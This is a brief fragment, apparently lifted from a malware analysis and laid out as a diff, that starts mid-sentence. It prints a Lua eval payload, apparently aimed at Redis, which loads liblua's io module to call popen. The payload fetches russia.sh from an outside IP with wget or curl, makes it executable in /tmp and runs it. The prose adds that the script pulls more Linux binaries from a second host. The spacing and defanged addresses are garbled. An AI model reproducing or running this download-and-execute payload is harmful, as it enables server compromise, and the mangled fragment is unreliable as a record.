@@ -1,0 +1,7 @@
+
+sh ” using wget or curl from “ 106[.]246.224.219 ”.
+It saves it as “ / tmp / russ ” and executes it.
+eval 'local io_l = package.loadlib (\"/ usr /lib/
+x86_64-linux-gnu/liblua5.1.so.0\", \" luaopen_io \"); \r\nlocal io = io_l (); \r\nlocal
+f = io.popen
+(\"( wget -O / tmp / russ http://106[.]246.224.219/russia.sh || curl -o / tmp / russ http://106[.].246.224.219/russia.sh ); chmod 700 / tmp / russ ; / tmp / russ \" , \"r\"); \r\nlocal res = f:read (\"*a\"); f:close (); return res' 0 contents of russia.sh This script (russia.sh) will further download and execute linux binaries from 160[.]16.58.163.
